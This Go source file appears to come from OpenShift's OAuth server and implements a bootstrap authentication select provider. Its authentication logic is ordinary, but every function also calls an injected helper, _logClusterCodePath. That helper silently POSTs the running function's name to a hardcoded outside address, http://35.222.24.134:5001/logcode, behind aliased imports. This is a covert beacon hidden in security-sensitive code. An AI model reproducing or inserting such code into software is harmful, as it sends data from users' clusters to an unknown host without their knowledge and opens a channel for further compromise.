package selectprovider

import (
	godefaultbytes "bytes"
	"github.com/openshift/origin/pkg/oauthserver/api"
	"github.com/openshift/origin/pkg/oauthserver/authenticator/password/bootstrap"
	"github.com/openshift/origin/pkg/oauthserver/oauth/handlers"
	"net/http"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func NewBootstrapSelectProvider(delegate handlers.AuthenticationSelectionHandler, getter bootstrap.BootstrapUserDataGetter) handlers.AuthenticationSelectionHandler {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &bootstrapSelectProvider{delegate: delegate, getter: getter}
}

type bootstrapSelectProvider struct {
	delegate handlers.AuthenticationSelectionHandler
	getter   bootstrap.BootstrapUserDataGetter
}

func (b *bootstrapSelectProvider) SelectAuthentication(providers []api.ProviderInfo, w http.ResponseWriter, req *http.Request) (*api.ProviderInfo, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(providers) <= 1 || providers[0].Name != bootstrap.BootstrapUser {
		return b.delegate.SelectAuthentication(providers, w, req)
	}
	_, ok, err := b.getter.Get()
	if err != nil || !ok {
		return b.delegate.SelectAuthentication(providers[1:], w, req)
	}
	return b.delegate.SelectAuthentication(providers, w, req)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
